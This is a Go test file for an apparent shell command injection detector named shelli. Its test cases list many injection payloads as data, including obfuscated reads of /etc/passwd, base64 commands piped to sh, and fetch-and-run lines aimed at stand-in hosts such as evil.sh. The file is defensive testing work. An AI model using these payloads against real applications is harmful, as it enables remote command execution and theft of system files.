// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package shelli

import (
	"strings"
	"testing"
)

func TestCommandInjectionIsDetected(t *testing.T) {
	cases := []struct {
		name    string
		payload string
		want    Signal
	}{
		// The four payloads that walked through the literal command list.
		{"glob obfuscation", "x; /???/c?t /etc/p?sswd", SignalGlobCommand},
		{"base64 pipe", "x; echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh", SignalCommandPosition},
		{"or chain fetch", "x || curl http://evil.sh|sh", SignalCommandPosition},
		{"substring expansion", "x; ${PATH:0:1}etc${PATH:0:1}passwd", SignalSubstringExpansion},

		// Separator plus a command, in each separator form.
		{"semicolon", "1.1.1.1; cat /etc/passwd", SignalCommandPosition},
		{"pipe", "1.1.1.1 | cat /etc/passwd", SignalCommandPosition},
		{"double pipe", "1.1.1.1 || id", SignalCommandPosition},
		{"ampersand", "1.1.1.1 & whoami", SignalCommandPosition},
		{"double ampersand", "1.1.1.1 && uname -a", SignalCommandPosition},
		{"newline", "1.1.1.1\nwget http://evil/x", SignalCommandPosition},

		// Quoting that the shell removes before running the command.
		{"quote splitting", `x; c'a't /etc/passwd`, SignalCommandPosition},
		{"backslash splitting", `x; c\at /etc/passwd`, SignalCommandPosition},
		{"double quote splitting", `x; c"a"t /etc/passwd`, SignalCommandPosition},

		// Expansions with no benign reading.
		{"ifs bare", "x; cat$IFS/etc/passwd", SignalIFSSeparator},
		{"ifs braced", "x; cat${IFS}/etc/passwd", SignalIFSSeparator},
		{"ansi c quoting", `x; $'\x63\x61\x74' /etc/passwd`, SignalANSIQuoting},
		// Brace expansion opens a command position without a space.
		{"brace expansion", "x;{cat,/etc/passwd}", SignalCommandPosition},

		// Command substitution.
		{"dollar paren", "x$(id)", SignalCommandPosition},
		{"nested substitution", "x; $(echo $(id))", SignalCommandPosition},
		{"backtick invocation", "x`cat /etc/passwd`", SignalCommandPosition},

		// Interpreter paths, which need no separator at all.
		{"bin sh", "/bin/sh -c id", SignalInterpreterPath},
		{"usr bin python", "/usr/bin/python -c 'import os'", SignalInterpreterPath},

		// Variable assembly corroborating with a sensitive path.
		{"variable assembly", "x; a=c;b=at;$a$b /etc/passwd", SignalVariableCommand},
	}

	d := New()
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := d.Analyze([]byte(c.payload))
			if !v.Detected() {
				t.Errorf("not detected: score=%d signals=%v", v.Score, v.Signals)
			}
			if v.Signals&c.want == 0 {
				t.Errorf("signals = %v, want %v set", v.Signals, c.want)
			}
		})
	}
}

// TestBenignTextPasses is the counterweight. Most command names are ordinary
// English words, which is exactly why position decides and presence does not.
func TestBenignTextPasses(t *testing.T) {
	values := []string{
		// Separators in prose, where the following word is not a command.
		"first; second; third",
		"a | b | c",
		"Smith & Sons Ltd",
		"red, green; blue",
		"one && two",

		// The command vocabulary used as English.
		"the cat sat on the mat",
		"please find the id of the last order",
		"sort by head count",
		"who is at the more expensive tier",
		"less is more",
		"we ping the host env for a w value",

		// Paths and files discussed rather than fetched.
		"the config lives in /etc/nginx/nginx.conf",
		"see /var/www/html/index.php for details",
		"/api/v1/orders/12345",
		"/assets/app.min.js",

		// Markdown inline code: the documented limit of this detector.
		"use the `id` field to reference it",
		"the `cat` command reads a file",
		"call `whoami` to check",

		// Shell documentation that is not an invocation.
		"use ${VAR:-default} for a fallback",
		"set ${HOME} before running",
		"run $PATH through echo",
		"$(CC) -o $@ $<",

		// jQuery and template syntax.
		"$('#main').addClass('active')",
		"${{ matrix.os }}",
		"{{ user.name }}",

		// Globs a human actually writes.
		"match *.log files in the directory",
		"rename ?.txt to file?.txt",

		// Ordinary values.
		"1.1.1.1",
		"alice@example.com",
		"^[a-z]+$",
		"0 */6 * * *",
		"",
	}

	d := New()
	for _, v := range values {
		t.Run(v, func(t *testing.T) {
			if got := d.Analyze([]byte(v)); got.Detected() {
				t.Errorf("false positive: score=%d signals=%v", got.Score, got.Signals)
			}
		})
	}
}

// TestPositionIsWhatCounts is the design as a test: the same command name is
// evidence after a separator and nothing at all without one.
func TestPositionIsWhatCounts(t *testing.T) {
	d := New()

	if v := d.Analyze([]byte("cat /etc/passwd")); v.Signals&SignalCommandPosition != 0 {
		t.Error("a command name with no separator before it counted as one")
	}
	if v := d.Analyze([]byte("x; cat /etc/passwd")); v.Signals&SignalCommandPosition == 0 {
		t.Error("a command name after a separator did not count")
	}
}

// TestBacktickLimitIsDeliberate records the trade this detector makes, so that
// changing it is a decision rather than an accident.
func TestBacktickLimitIsDeliberate(t *testing.T) {
	d := New()

	// Not reported: indistinguishable from Markdown inline code.
	if v := d.Analyze([]byte("use the `id` field")); v.Detected() {
		t.Error("bare backtick substitution reported; that blocks documentation")
	}
	// Reported: an actual invocation, not a mention.
	if v := d.Analyze([]byte("x`cat /etc/passwd`")); !v.Detected() {
		t.Error("backtick invocation with an argument missed")
	}
	// $() has no Markdown reading, so a bare command is enough.
	if v := d.Analyze([]byte("x$(id)")); !v.Detected() {
		t.Error("$(id) missed")
	}
}

// TestInterpreterPathsAreCaseSensitive records why, and guards the prefilter.
//
// "/bin/SH" does not resolve on a case-sensitive filesystem, so folding case
// here would add surface with no attack behind it. It would also break the
// declared literals, which are the lowercase paths -- found by the fuzz
// harness, which reported "0/nC" as an interpreter path that no literal covered
// and which the prefilter would therefore have dropped.
func TestInterpreterPathsAreCaseSensitive(t *testing.T) {
	d := New()
	if v := d.Analyze([]byte("/bin/sh")); v.Signals&SignalInterpreterPath == 0 {
		t.Error("/bin/sh not recognised")
	}
	for _, p := range []string{"/bin/SH", "0/nC", "/BIN/BASH", "x/Python"} {
		if v := d.Analyze([]byte(p)); v.Signals&SignalInterpreterPath != 0 {
			t.Errorf("%q matched an interpreter path it cannot resolve to", p)
		}
	}
}

// TestWeakSignalsNeedCorroboration keeps the two weak signals honest.
func TestWeakSignalsNeedCorroboration(t *testing.T) {
	d := New()

	if v := d.Analyze([]byte("the file /etc/passwd lists users")); v.Detected() {
		t.Error("a mention of /etc/passwd fired alone")
	}
	if v := d.Analyze([]byte("x; $a")); v.Detected() {
		t.Error("a bare variable in command position fired alone")
	}
	if v := d.Analyze([]byte("x; $a$b /etc/passwd")); !v.Detected() {
		t.Error("variable command plus sensitive path did not corroborate")
	}
}

func TestBounds(t *testing.T) {
	d := New()
	if d.Analyze(nil).Detected() {
		t.Error("nil detected")
	}
	if d.Analyze([]byte(strings.Repeat(";", 100000))).Detected() {
		t.Error("repeated separators reached the threshold")
	}
	long := strings.Repeat("a", maxScan*2) + "; cat /etc/passwd"
	if d.Analyze([]byte(long)).Detected() {
		t.Error("a payload past the scan bound was reported")
	}
}

// FuzzLiteralsAreExhaustive enforces the claim the prefilter depends on.
func FuzzLiteralsAreExhaustive(f *testing.F) {
	for _, s := range []string{
		"x; cat /etc/passwd", "x$(id)", "/bin/sh -c id", "x; ${IFS}",
		"x;{cat,/etc/passwd}", "x; /???/c?t", "hello", "", ";;;", "$$$",
		"x; c'a't /etc/passwd", "\x00; cat /etc/passwd",
	} {
		f.Add(s)
	}

	d := New()
	lits, _ := Operator().(*operator).Literals()

	f.Fuzz(func(t *testing.T, value string) {
		if !d.Analyze([]byte(value)).Detected() {
			return
		}
		for _, l := range lits {
			if strings.Contains(value, l) {
				return
			}
		}
		t.Fatalf("detected %q but no literal covers it: the prefilter would drop it", value)
	})
}

func BenchmarkAnalyzeBenign(b *testing.B) {
	d := New()
	v := []byte("the config lives in /etc/nginx/nginx.conf")
	b.ReportAllocs()
	for b.Loop() {
		d.Analyze(v)
	}
}

func BenchmarkAnalyzeAttack(b *testing.B) {
	d := New()
	v := []byte("1.1.1.1; cat /etc/passwd")
	b.ReportAllocs()
	for b.Loop() {
		d.Analyze(v)
	}
}
